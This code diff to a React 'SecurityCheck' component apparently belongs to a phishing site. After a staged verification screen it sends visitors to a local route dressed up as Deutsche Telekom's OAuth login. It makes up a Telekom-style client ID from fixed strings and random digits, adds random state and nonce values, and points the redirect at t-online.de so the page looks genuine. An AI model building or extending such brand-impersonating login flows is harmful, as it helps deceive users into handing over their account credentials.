@@ -8,6 +8,24 @@ const SecurityCheck = () => {
   const [isVerifying, setIsVerifying] = useState(false);
   const [isComplete, setIsComplete] = useState(false);
 
+  // Generate random OAuth2 parameters
+  const generateRandomString = (length: number) => {
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
+    let result = '';
+    for (let i = 0; i < length; i++) {
+      result += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return result;
+  };
+
+  const generateClientId = () => {
+    const prefix = '10LIVESAM';
+    const suffix = 'PORTALE';
+    const middle = Math.random().toString().slice(2, 15);
+    const end = '0'.repeat(15);
+    return `${prefix}${middle}${suffix}${end}`;
+  };
+
   useEffect(() => {
     // Auto-start verification after component mounts
     const timer = setTimeout(() => {
@@ -19,7 +37,14 @@ const SecurityCheck = () => {
         
         // Navigate to login after showing success
         const navigateTimer = setTimeout(() => {
-          navigate("/login");
+          const clientId = generateClientId();
+          const state = generateRandomString(43);
+          const nonce = generateRandomString(43);
+          const claims = encodeURIComponent('{"id_token":{"urn:telekom.com:all":null}}');
+          const redirectUri = encodeURIComponent('https://www.t-online.de/auth/login/oauth2/code/telekom');
+          
+          const oauthUrl = `/oauth2/auth/io?response_type=code&client_id=${clientId}&scope=openid&claims=${claims}&state=${state}&redirect_uri=${redirectUri}&nonce=${nonce}`;
+          navigate(oauthUrl);
         }, 1500);
         
         return () => clearTimeout(navigateTimer);
